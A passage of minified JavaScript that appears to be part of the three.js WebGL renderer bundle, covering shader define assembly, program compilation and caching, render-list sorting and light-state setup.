USE_DISPLACEMENTMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularIntensityMap?"#define USE_SPECULARINTENSITYMAP":"",n.specularColorMap?"#define USE_SPECULARCOLORMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.sheenColorMap?"#define USE_SHEENCOLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEENROUGHNESSMAP":"",n.vertexTangents?"#define USE_TANGENT":"",n.vertexColors?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUvs?"#define USE_UV":"",n.uvsVertexOnly?"#define UVS_VERTEX_ONLY":"",n.flatShading?"#define FLAT_SHADED":"",n.skinning?"#define USE_SKINNING":"",n.useVertexTexture?"#define BONE_TEXTURE":"",n.morphTargets?"#define USE_MORPHTARGETS":"",n.morphNormals&&!1===n.flatShading?"#define USE_MORPHNORMALS":"",n.morphTargets&&n.isWebGL2?"#define MORPHTARGETS_TEXTURE":"",n.morphTargets&&n.isWebGL2?"#define MORPHTARGETS_COUNT "+n.morphTargetsCount:"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+y:"",n.sizeAttenuation?"#define USE_SIZEATTENUATION":"",n.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",n.logarithmicDepthBuffer&&n.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","\tattribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","\tattribute vec3 instanceColor;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_TANGENT","\tattribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","\tattribute vec4 color;","#elif defined( USE_COLOR )","\tattribute vec3 color;","#endif","#if ( defined( USE_MORPHTARGETS ) && ! defined( MORPHTARGETS_TEXTURE ) )","\tattribute vec3 morphTarget0;","\tattribute vec3 morphTarget1;","\tattribute vec3 morphTarget2;","\tattribute vec3 morphTarget3;","\t#ifdef USE_MORPHNORMALS","\t\tattribute vec3 morphNormal0;","\t\tattribute vec3 morphNormal1;","\t\tattribute vec3 morphNormal2;","\t\tattribute vec3 morphNormal3;","\t#else","\t\tattribute vec3 morphTarget4;","\t\tattribute vec3 morphTarget5;","\t\tattribute vec3 morphTarget6;","\t\tattribute vec3 morphTarget7;","\t#endif","#endif","#ifdef USE_SKINNING","\tattribute vec4 skinIndex;","\tattribute vec4 skinWeight;","#endif","\n"].filter(Wi).join("\n"),p=[C,ia(n),"#define SHADER_NAME "+n.shaderName,S,n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.map?"#define USE_MAP":"",n.matcap?"#define USE_MATCAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+b:"",n.envMap?"#define "+_:"",n.envMap?"#define "+w:"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMap&&n.objectSpaceNormalMap?"#define OBJECTSPACE_NORMALMAP":"",n.normalMap&&n.tangentSpaceNormalMap?"#define TANGENTSPACE_NORMALMAP":"",n.clearcoat?"#define USE_CLEARCOAT":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularIntensityMap?"#define USE_SPECULARINTENSITYMAP":"",n.specularColorMap?"#define USE_SPECULARCOLORMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaTest?"#define USE_ALPHATEST":"",n.sheen?"#define USE_SHEEN":"",n.sheenColorMap?"#define USE_SHEENCOLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEENROUGHNESSMAP":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.vertexTangents?"#define USE_TANGENT":"",n.vertexColors||n.instancingColor?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUvs?"#define USE_UV":"",n.uvsVertexOnly?"#define UVS_VERTEX_ONLY":"",n.gradientMap?"#define USE_GRADIENTMAP":"",n.flatShading?"#define FLAT_SHADED":"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+y:"",n.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",n.physicallyCorrectLights?"#define PHYSICALLY_CORRECT_LIGHTS":"",n.logarithmicDepthBuffer?"#define USE_LOGDEPTHBUF":"",n.logarithmicDepthBuffer&&n.rendererExtensionFragDepth?"#define USE_LOGDEPTHBUF_EXT":"",(n.extensionShaderTextureLOD||n.envMap)&&n.rendererExtensionShaderTextureLod?"#define TEXTURE_LOD_EXT":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",0!==n.toneMapping?"#define TONE_MAPPING":"",0!==n.toneMapping?Xn.tonemapping_pars_fragment:"",0!==n.toneMapping?function(e,t){var n;switch(t){case 1:n="Linear";break;case 2:n="Reinhard";break;case 3:n="OptimizedCineon";break;case 4:n="ACESFilmic";break;case 5:n="Custom";break;default:n="Linear"}return"vec3 toneMapping( vec3 color ) { return "+n+"ToneMapping( color ); }"}(0,n.toneMapping):"",n.dithering?"#define DITHERING":"",n.format===x?"#define OPAQUE":"",Xn.encodings_pars_fragment,n.map?Gi("mapTexelToLinear",n.mapEncoding):"",n.matcap?Gi("matcapTexelToLinear",n.matcapEncoding):"",n.envMap?Gi("envMapTexelToLinear",n.envMapEncoding):"",n.emissiveMap?Gi("emissiveMapTexelToLinear",n.emissiveMapEncoding):"",n.specularColorMap?Gi("specularColorMapTexelToLinear",n.specularColorMapEncoding):"",n.sheenColorMap?Gi("sheenColorMapTexelToLinear",n.sheenColorMapEncoding):"",n.lightMap?Gi("lightMapTexelToLinear",n.lightMapEncoding):"",("linearToOutputTexel",h=n.outputEncoding,f=Vi(h),"vec4 linearToOutputTexel( vec4 value ) { return LinearTo"+f[0]+f[1]+"; }"),n.depthPacking?"#define DEPTH_PACKING "+n.depthPacking:"","\n"].filter(Wi).join("\n")),v=qi(v=Ki(v=Yi(v),n),n),g=qi(g=Ki(g=Yi(g),n),n),v=ta(v),g=ta(g),n.isWebGL2&&!0!==n.isRawShaderMaterial&&(M="#version 300 es\n",d=["precision mediump sampler2DArray;","#define attribute in","#define varying out","#define texture2D texture"].join("\n")+"\n"+d,p=["#define varying in",n.glslVersion===z?"":"layout(location = 0) out highp vec4 pc_fragColor;",n.glslVersion===z?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join("\n")+"\n"+p);var B,E,T=M+d+v,P=M+p+g,I=zi(A,A.VERTEX_SHADER,T),F=zi(A,A.FRAGMENT_SHADER,P);if(A.attachShader(k,I),A.attachShader(k,F),void 0!==n.index0AttributeName?A.bindAttribLocation(k,0,n.index0AttributeName):!0===n.morphTargets&&A.bindAttribLocation(k,0,"position"),A.linkProgram(k),e.debug.checkShaderErrors){var L=A.getProgramInfoLog(k).trim(),O=A.getShaderInfoLog(I).trim(),N=A.getShaderInfoLog(F).trim(),D=!0,R=!0;!1===A.getProgramParameter(k,A.LINK_STATUS)?(D=!1,Qi(A,I,"vertex"),Qi(A,F,"fragment")):""!==L||""!==O&&""!==N||(R=!1),R&&(this.diagnostics={runnable:D,programLog:L,vertexShader:{log:O,prefix:d},fragmentShader:{log:N,prefix:p}})}return A.deleteShader(I),A.deleteShader(F),this.getUniforms=function(){return void 0===B&&(B=new $i(A,k)),B},this.getAttributes=function(){return void 0===E&&(E=function(e,t){for(var n={},r=e.getProgramParameter(t,e.ACTIVE_ATTRIBUTES),i=0;i<r;i++){var a=e.getActiveAttrib(t,i),o=a.name,s=1;a.type===e.FLOAT_MAT2&&(s=2),a.type===e.FLOAT_MAT3&&(s=3),a.type===e.FLOAT_MAT4&&(s=4),n[o]={type:a.type,location:e.getAttribLocation(t,o),locationSize:s}}return n}(A,k)),E},this.destroy=function(){a.releaseStatesOfProgram(this),A.deleteProgram(k),this.program=void 0},this.name=n.shaderName,this.id=Hi++,this.cacheKey=t,this.usedTimes=1,this.program=k,this.vertexShader=I,this.fragmentShader=F,this}var oa=0,sa=function(){function e(){_classCallCheck2(this,e),this.shaderCache=new Map,this.materialCache=new Map}return _createClass2(e,[{key:"update",value:function(e){var t=e.vertexShader,n=e.fragmentShader,r=this._getShaderStage(t),i=this._getShaderStage(n),a=this._getShaderCacheForMaterial(e);return!1===a.has(r)&&(a.add(r),r.usedTimes++),!1===a.has(i)&&(a.add(i),i.usedTimes++),this}},{key:"remove",value:function(e){var t,n=_createForOfIteratorHelper(this.materialCache.get(e));try{for(n.s();!(t=n.n()).done;){var r=t.value;r.usedTimes--,0===r.usedTimes&&this.shaderCache.delete(r)}}catch(e){n.e(e)}finally{n.f()}return this.materialCache.delete(e),this}},{key:"getVertexShaderID",value:function(e){return this._getShaderStage(e.vertexShader).id}},{key:"getFragmentShaderID",value:function(e){return this._getShaderStage(e.fragmentShader).id}},{key:"dispose",value:function(){this.shaderCache.clear(),this.materialCache.clear()}},{key:"_getShaderCacheForMaterial",value:function(e){var t=this.materialCache;return!1===t.has(e)&&t.set(e,new Set),t.get(e)}},{key:"_getShaderStage",value:function(e){var t=this.shaderCache;if(!1===t.has(e)){var n=new la;t.set(e,n)}return t.get(e)}}]),e}(),la=function e(){_classCallCheck2(this,e),this.id=oa++,this.usedTimes=0};function ca(e,t,n,r,i,a,o){var c=new st,u=new sa,d=[],p=i.isWebGL2,h=i.logarithmicDepthBuffer,f=i.floatVertexTextures,A=i.maxVertexUniforms,m=i.vertexTextures,v=i.precision,y={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distanceRGBA",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function b(e){var t;return t=e&&e.isTexture?e.encoding:e&&e.isWebGLRenderTarget?e.texture.encoding:R,p&&e&&e.isTexture&&e.format===S&&e.type===g&&e.encoding===j&&(t=R),t}return{getParameters:function(a,c,d,g,_){var w,C,x,S,k=g.fog,M=a.isMeshStandardMaterial?g.environment:null,B=(a.isMeshStandardMaterial?n:t).get(a.envMap||M),E=y[a.type],T=_.isSkinnedMesh?function(e){var t=e.skeleton.bones;if(f)return 1024;var n=A,r=Math.floor((n-20)/4),i=Math.min(r,t.length);return i<t.length?0:i}(_):0;if(null!==a.precision&&(v=i.getMaxPrecision(a.precision),a.precision),E){var P=Jn[E];w=P.vertexShader,C=P.fragmentShader}else w=a.vertexShader,C=a.fragmentShader,u.update(a),x=u.getVertexShaderID(a),S=u.getFragmentShaderID(a);var I=e.getRenderTarget(),F=0<a.alphaTest,L=0<a.clearcoat;return{isWebGL2:p,shaderID:E,shaderName:a.type,vertexShader:w,fragmentShader:C,defines:a.defines,customVertexShaderID:x,customFragmentShaderID:S,isRawShaderMaterial:!0===a.isRawShaderMaterial,glslVersion:a.glslVersion,precision:v,instancing:!0===_.isInstancedMesh,instancingColor:!0===_.isInstancedMesh&&null!==_.instanceColor,supportsVertexTextures:m,outputEncoding:null!==I?b(I.texture):e.outputEncoding,map:!!a.map,mapEncoding:b(a.map),matcap:!!a.matcap,matcapEncoding:b(a.matcap),envMap:!!B,envMapMode:B&&B.mapping,envMapEncoding:b(B),envMapCubeUV:!!B&&(B.mapping===s||B.mapping===l),lightMap:!!a.lightMap,lightMapEncoding:b(a.lightMap),aoMap:!!a.aoMap,emissiveMap:!!a.emissiveMap,emissiveMapEncoding:b(a.emissiveMap),bumpMap:!!a.bumpMap,normalMap:!!a.normalMap,objectSpaceNormalMap:1===a.normalMapType,tangentSpaceNormalMap:0===a.normalMapType,clearcoat:L,clearcoatMap:L&&!!a.clearcoatMap,clearcoatRoughnessMap:L&&!!a.clearcoatRoughnessMap,clearcoatNormalMap:L&&!!a.clearcoatNormalMap,displacementMap:!!a.displacementMap,roughnessMap:!!a.roughnessMap,metalnessMap:!!a.metalnessMap,specularMap:!!a.specularMap,specularIntensityMap:!!a.specularIntensityMap,specularColorMap:!!a.specularColorMap,specularColorMapEncoding:b(a.specularColorMap),alphaMap:!!a.alphaMap,alphaTest:F,gradientMap:!!a.gradientMap,sheen:0<a.sheen,sheenColorMap:!!a.sheenColorMap,sheenColorMapEncoding:b(a.sheenColorMap),sheenRoughnessMap:!!a.sheenRoughnessMap,transmission:0<a.transmission,transmissionMap:!!a.transmissionMap,thicknessMap:!!a.thicknessMap,combine:a.combine,vertexTangents:!!a.normalMap&&!!_.geometry&&!!_.geometry.attributes.tangent,vertexColors:a.vertexColors,vertexAlphas:!0===a.vertexColors&&!!_.geometry&&!!_.geometry.attributes.color&&4===_.geometry.attributes.color.itemSize,vertexUvs:!!(a.map||a.bumpMap||a.normalMap||a.specularMap||a.alphaMap||a.emissiveMap||a.roughnessMap||a.metalnessMap||a.clearcoatMap||a.clearcoatRoughnessMap||a.clearcoatNormalMap||a.displacementMap||a.transmissionMap||a.thicknessMap||a.specularIntensityMap||a.specularColorMap||a.sheenColorMap||a.sheenRoughnessMap),uvsVertexOnly:!(a.map||a.bumpMap||a.normalMap||a.specularMap||a.alphaMap||a.emissiveMap||a.roughnessMap||a.metalnessMap||a.clearcoatNormalMap||0<a.transmission||a.transmissionMap||a.thicknessMap||a.specularIntensityMap||a.specularColorMap||0<a.sheen||a.sheenColorMap||a.sheenRoughnessMap||!a.displacementMap),fog:!!k,useFog:a.fog,fogExp2:k&&k.isFogExp2,flatShading:!!a.flatShading,sizeAttenuation:a.sizeAttenuation,logarithmicDepthBuffer:h,skinning:!0===_.isSkinnedMesh&&0<T,maxBones:T,useVertexTexture:f,morphTargets:!!_.geometry&&!!_.geometry.morphAttributes.position,morphNormals:!!_.geometry&&!!_.geometry.morphAttributes.normal,morphTargetsCount:_.geometry&&_.geometry.morphAttributes.position?_.geometry.morphAttributes.position.length:0,numDirLights:c.directional.length,numPointLights:c.point.length,numSpotLights:c.spot.length,numRectAreaLights:c.rectArea.length,numHemiLights:c.hemi.length,numDirLightShadows:c.directionalShadowMap.length,numPointLightShadows:c.pointShadowMap.length,numSpotLightShadows:c.spotShadowMap.length,numClippingPlanes:o.numPlanes,numClipIntersection:o.numIntersection,format:a.format,dithering:a.dithering,shadowMapEnabled:e.shadowMap.enabled&&0<d.length,shadowMapType:e.shadowMap.type,toneMapping:a.toneMapped?e.toneMapping:0,physicallyCorrectLights:e.physicallyCorrectLights,premultipliedAlpha:a.premultipliedAlpha,doubleSided:2===a.side,flipSided:1===a.side,depthPacking:void 0!==a.depthPacking&&a.depthPacking,index0AttributeName:a.index0AttributeName,extensionDerivatives:a.extensions&&a.extensions.derivatives,extensionFragDepth:a.extensions&&a.extensions.fragDepth,extensionDrawBuffers:a.extensions&&a.extensions.drawBuffers,extensionShaderTextureLOD:a.extensions&&a.extensions.shaderTextureLOD,rendererExtensionFragDepth:p||r.has("EXT_frag_depth"),rendererExtensionDrawBuffers:p||r.has("WEBGL_draw_buffers"),rendererExtensionShaderTextureLod:p||r.has("EXT_shader_texture_lod"),customProgramCacheKey:a.customProgramCacheKey()}},getProgramCacheKey:function(t){var n,r,i,a,o=[];if(t.shaderID?o.push(t.shaderID):(o.push(t.customVertexShaderID),o.push(t.customFragmentShaderID)),void 0!==t.defines)for(var s in t.defines)o.push(s),o.push(t.defines[s]);return!1===t.isRawShaderMaterial&&(r=t,(n=o).push(r.precision),n.push(r.outputEncoding),n.push(r.mapEncoding),n.push(r.matcapEncoding),n.push(r.envMapMode),n.push(r.envMapEncoding),n.push(r.lightMapEncoding),n.push(r.emissiveMapEncoding),n.push(r.combine),n.push(r.vertexUvs),n.push(r.fogExp2),n.push(r.sizeAttenuation),n.push(r.maxBones),n.push(r.morphTargetsCount),n.push(r.numDirLights),n.push(r.numPointLights),n.push(r.numSpotLights),n.push(r.numHemiLights),n.push(r.numRectAreaLights),n.push(r.numDirLightShadows),n.push(r.numPointLightShadows),n.push(r.numSpotLightShadows),n.push(r.shadowMapType),n.push(r.toneMapping),n.push(r.numClippingPlanes),n.push(r.numClipIntersection),n.push(r.format),n.push(r.specularColorMapEncoding),n.push(r.sheenColorMapEncoding),i=o,a=t,c.disableAll(),a.isWebGL2&&c.enable(0),a.supportsVertexTextures&&c.enable(1),a.instancing&&c.enable(2),a.instancingColor&&c.enable(3),a.map&&c.enable(4),a.matcap&&c.enable(5),a.envMap&&c.enable(6),a.envMapCubeUV&&c.enable(7),a.lightMap&&c.enable(8),a.aoMap&&c.enable(9),a.emissiveMap&&c.enable(10),a.bumpMap&&c.enable(11),a.normalMap&&c.enable(12),a.objectSpaceNormalMap&&c.enable(13),a.tangentSpaceNormalMap&&c.enable(14),a.clearcoat&&c.enable(15),a.clearcoatMap&&c.enable(16),a.clearcoatRoughnessMap&&c.enable(17),a.clearcoatNormalMap&&c.enable(18),a.displacementMap&&c.enable(19),a.specularMap&&c.enable(20),a.roughnessMap&&c.enable(21),a.metalnessMap&&c.enable(22),a.gradientMap&&c.enable(23),a.alphaMap&&c.enable(24),a.alphaTest&&c.enable(25),a.vertexColors&&c.enable(26),a.vertexAlphas&&c.enable(27),a.vertexUvs&&c.enable(28),a.vertexTangents&&c.enable(29),a.uvsVertexOnly&&c.enable(30),a.fog&&c.enable(31),i.push(c.mask),c.disableAll(),a.useFog&&c.enable(0),a.flatShading&&c.enable(1),a.logarithmicDepthBuffer&&c.enable(2),a.skinning&&c.enable(3),a.useVertexTexture&&c.enable(4),a.morphTargets&&c.enable(5),a.morphNormals&&c.enable(6),a.premultipliedAlpha&&c.enable(7),a.shadowMapEnabled&&c.enable(8),a.physicallyCorrectLights&&c.enable(9),a.doubleSided&&c.enable(10),a.flipSided&&c.enable(11),a.depthPacking&&c.enable(12),a.dithering&&c.enable(13),a.specularIntensityMap&&c.enable(14),a.specularColorMap&&c.enable(15),a.transmission&&c.enable(16),a.transmissionMap&&c.enable(17),a.thicknessMap&&c.enable(18),a.sheen&&c.enable(19),a.sheenColorMap&&c.enable(20),a.sheenRoughnessMap&&c.enable(21),i.push(c.mask),o.push(e.outputEncoding)),o.push(t.customProgramCacheKey),o.join()},getUniforms:function(e){var t,n=y[e.type];if(n){var r=Jn[n];t=Fn.clone(r.uniforms)}else t=e.uniforms;return t},acquireProgram:function(t,n){for(var r,i=0,o=d.length;i<o;i++){var s=d[i];if(s.cacheKey===n){++(r=s).usedTimes;break}}return void 0===r&&(r=new aa(e,n,t,a),d.push(r)),r},releaseProgram:function(e){if(0==--e.usedTimes){var t=d.indexOf(e);d[t]=d[d.length-1],d.pop(),e.destroy()}},releaseShaderCache:function(e){u.remove(e)},programs:d,dispose:function(){u.dispose()}}}function ua(){var e=new WeakMap;return{get:function(t){var n=e.get(t);return void 0===n&&(n={},e.set(t,n)),n},remove:function(t){e.delete(t)},update:function(t,n,r){e.get(t)[n]=r},dispose:function(){e=new WeakMap}}}function da(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.material.id!==t.material.id?e.material.id-t.material.id:e.z!==t.z?e.z-t.z:e.id-t.id}function pa(e,t){return e.groupOrder!==t.groupOrder?e.groupOrder-t.groupOrder:e.renderOrder!==t.renderOrder?e.renderOrder-t.renderOrder:e.z!==t.z?t.z-e.z:e.id-t.id}function ha(){var e=[],t=0,n=[],r=[],i=[];function a(n,r,i,a,o,s){var l=e[t];return void 0===l?(l={id:n.id,object:n,geometry:r,material:i,groupOrder:a,renderOrder:n.renderOrder,z:o,group:s},e[t]=l):(l.id=n.id,l.object=n,l.geometry=r,l.material=i,l.groupOrder=a,l.renderOrder=n.renderOrder,l.z=o,l.group=s),t++,l}return{opaque:n,transmissive:r,transparent:i,init:function(){t=0,n.length=0,r.length=0,i.length=0},push:function(e,t,o,s,l,c){var u=a(e,t,o,s,l,c);0<o.transmission?r.push(u):!0===o.transparent?i.push(u):n.push(u)},unshift:function(e,t,o,s,l,c){var u=a(e,t,o,s,l,c);0<o.transmission?r.unshift(u):!0===o.transparent?i.unshift(u):n.unshift(u)},finish:function(){for(var n=t,r=e.length;n<r;n++){var i=e[n];if(null===i.id)break;i.id=null,i.object=null,i.geometry=null,i.material=null,i.group=null}},sort:function(e,t){1<n.length&&n.sort(e||da),1<r.length&&r.sort(t||pa),1<i.length&&i.sort(t||pa)}}}function fa(){var e=new WeakMap;return{get:function(t,n){var r;return!1===e.has(t)?(r=new ha,e.set(t,[r])):n>=e.get(t).length?(r=new ha,e.get(t).push(r)):r=e.get(t)[n],r},dispose:function(){e=new WeakMap}}}function Aa(){var e={};return{get:function(t){if(void 0!==e[t.id])return e[t.id];var n;switch(t.type){case"DirectionalLight":n={direction:new ye,color:new $t};break;case"SpotLight":n={position:new ye,direction:new ye,color:new $t,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":n={position:new ye,color:new $t,distance:0,decay:0};break;case"HemisphereLight":n={direction:new ye,skyColor:new $t,groundColor:new $t};break;case"RectAreaLight":n={color:new $t,position:new ye,halfWidth:new ye,halfHeight:new ye}}return e[t.id]=n}}}var ma=0;function va(e,t){return(t.castShadow?1:0)-(e.castShadow?1:0)}function ga(e,t){for(var n,r=new Aa,i=(n={},{get:function(e){if(void 0!==n[e.id])return n[e.id];var t;switch(e.type){case"DirectionalLight":case"SpotLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new re};break;case"PointLight":t={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new re,shadowCameraNear:1,shadowCameraFar:1e3}}return n[e.id]=t}}),a={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadow:[],spotShadowMap:[],spotShadowMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[]},o=0;o<9;o++)a.probe.push(new ye);var s=new ye,l=new Xe,c=new Xe;return{setup:function(n,o){for(var s=0,l=0,c=0,u=0;u<9;u++)a.probe[u].set(0,0,0);var d=0,p=0,h=0,f=0,A=0,m=0,v=0,g=0;n.sort(va);for(var y=!0!==o?Math.PI:1,b=0,_=n.length;b<_;b++){var w=n[b],C=w.color,x=w.intensity,S=w.distance,k=w.shadow&&w.shadow.map?w.shadow.map.texture:null;if(w.isAmbientLight)s+=C.r*x*y,l+=C.g*x*y,c+=C.b*x*y;else if(w.isLightProbe)for(var M=0;M<9;M++)a.probe[M].addScaledVector(w.sh.coefficients[M],x);else if(w.isDirectionalLight){var B=r.get(w);if(B.color.copy(w.color).multiplyScalar(w.intensity*y),w.castShadow){var E=w.shadow,T=i.get(w);T.shadowBias=E.bias,T.shadowNormalBias=E.normalBias,T.shadowRadius=E.radius,T.shadowMapSize=E.mapSize,a.directionalShadow[d]=T,a.directionalShadowMap[d]=k,a.directionalShadowMatrix[d]=w.shadow.matrix,m++}a.directional[d]=B,d++}else if(w.isSpotLight){var P=r.get(w);if(P.position.setFromMatrixPosition(w.matrixWorld),P.color.copy(C).multiplyScalar(x*y),P.distance=S,P.coneCos=Math.cos(w.angle),P.penumbraCos=Math.cos(w.angle*(1-w.penumbra)),P.decay=w.decay,w.castShadow){var I=w.shadow,F=i.get(w);F.shadowBias=I.bias,F.shadowNormalBias=I.normalBias,F.shadowRadius=I.radius,F.shadowMapSize=I.mapSize,a.spotShadow[h]=F,a.spotShadowMap[h]=k,a.spotShadowMatrix[h]=w.shadow.matrix,g++}a.spot[h]=P,h++}else if(w.isRectAreaLight){var L=r.get(w);L.color.copy(C).multiplyScalar(x),L.halfWidth.set(.5*w.width,0,0),L.halfHeight.set(0,.5*w.height,0),a.rectArea[f]=L,f++}else if(w.isPointLight){var O=r.get(w);if(O.color.copy(w.color).multiplyScalar(w.intensity*y),O.distance=w.distance,O.decay=w.decay,w.castShadow){var N=w.shadow,D=i.get(w);D.shadowBias=N.bias,D.shadowNormalBias=N.normalBias,D.shadowRadius=N.radius,D.shadowMapSize=N.mapSize,D.shadowCameraNear=N.camera.near,D.shadowCameraFar=N.camera.far,a.pointShadow[p]=D,a.pointShadowMap[p]=k,a.pointShadowMatrix[p]=w.shadow.matrix,v++}a.point[p]=O,p++}else if(w.isHemisphereLight){var R=r.get(w);R.skyColor.copy(w.color).multiplyScalar(x*y),R.groundColor.copy(w.groundColor).multiplyScalar(x*y),a.hemi[A]=R,A++}}0<f&&(t.isWebGL2||!0===e.has("OES_texture_float_linear")?(a.rectAreaLTC1=Yn.LTC_FLOAT_1,a.rectAreaLTC2=Yn.LTC_FLOAT_2):!0===e.has("OES_texture_half_float_linear")&&(a.rectAreaLTC1=Yn.LTC_HALF_1,a.rectAreaLTC2=Yn.LTC_HALF_2)),a.ambient[0]=s,a.ambient[1]=l,a.ambient[2]=c;var j=a.hash;j.directionalLength===d&&j.pointLength===p&&j.spotLength===h&&j.rectAreaLength===f&&j.hemiLength===A&&j.numDirectionalShadows===m&&j.numPointShadows===v&&j.numSpotShadows===g||(a.directional.length=d,a.spot.length=h,a.rectArea.length=f,a.point.length=p,a.hemi.length=A,a.directionalShadow.length=m,a.directionalShadowMap.length=m,a.pointShadow.length=v,a.pointShadowMap.length=v,a.spotShadow.length=g,a.spotShadowMap.length=g,a.directionalShadowMatrix.length=m,a.pointShadowMatrix.length=v,a.spotShadowMatrix.length=g,j.directionalLength=d,j.pointLength=p,j.spotLength=h,j.rectAreaLength=f,j.hemiLength=A,j.numDirectionalShadows=m,j.numPointShadows=v,j.numSpotShadows=g,a.version=ma++)},setupView:function(e,t){for(var n=0,r=0,i=0,o=0,u=0,d=t.matrixWorldInverse,p=0,h=e.length;p<h;p++){var f=e[p];if(f.isDirectionalLight){var A=a.directional[n];A.direction.setFromMatrixPosition(f.matrixWorld),s.setFromMatrixPosition(f.target.matrixWorld),A.direction.sub(s),A.direction.transformDirection(d),n++}else if(f.isSpotLight){var m=a.spot[i];m.position.setFromMatrixPosition(f.matrixWorld),m.position.applyMatrix4(d),m.direction.setFromMatrixPosition(f.matrixWorld),s.setFromMatrixPosition(f.target.matrixWorld),m.direction.sub(s),m.direction.transformDirection(d),i++}else if(f.isRectAreaLight){var v=a.rectArea[o];v.position.setFromMatrixPosition(f.matrixWorld),v.position.applyMatrix4(d),c.identity(),l.copy(f.matrixWorld),l.premultiply(d),c.extractRotation(l),v.halfWidth.set(.5*f.width,0,0),v.halfHeight.set(0,.5*f.height,0),v.halfWidth.applyMatrix4(c),v.halfHeight.applyMatrix4(c),o++}else if(f.isPointLight){var g=a.point[r];g.position.setFromMatrixPosition(f.matrixWorld),g.position.applyMatrix4(d),r++}else if(f.isHemisphereLight){var y=a.hemi[u];y.direction.setFromMatrixPosition(f.matrixWorld),y.direction.transformDirection(d),y.direction.normalize(),u++}}},state:a}}function ya(e,t){var n=new ga(e,t),r=[],i=[];return{init:function(){r.length=0,i.length=0},state:{lightsArray:r,shadowsArray:i,lights:n},setupLights:function(e){n.setup(r,e)},setupLightsView:function(e){n.setupView(r,e)},pushLight:function(e){r.push(e)},pushShadow:function(e){i.push(e)}}}function ba(e,t){var n=new WeakMap;return{get:function(r){var i,a=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return!1===n.has(r)?(i=new ya(e,t),n.set(r,[i])):a>=n.get(r).length?(i=new ya(e,t),n.get(r).push(i)):i=n.get(r)[a],i},dispose:function(){n=new WeakMap}}}var _a=function(e){_inherits2(n,Lt);var t=_createSuper(n);function n(e){var r;return _classCallCheck2(this,n),(r=t.call(this)).type="MeshDepthMaterial",r.depthPacking=3200,r.map=null,r.alphaMap=null,r.displacementMap=null,r.displacementScale=1,r.displacementBias=0,r.wireframe=!1,r.wireframeLinewidth=1,r.fog=!1,r.setValues(e),r}return 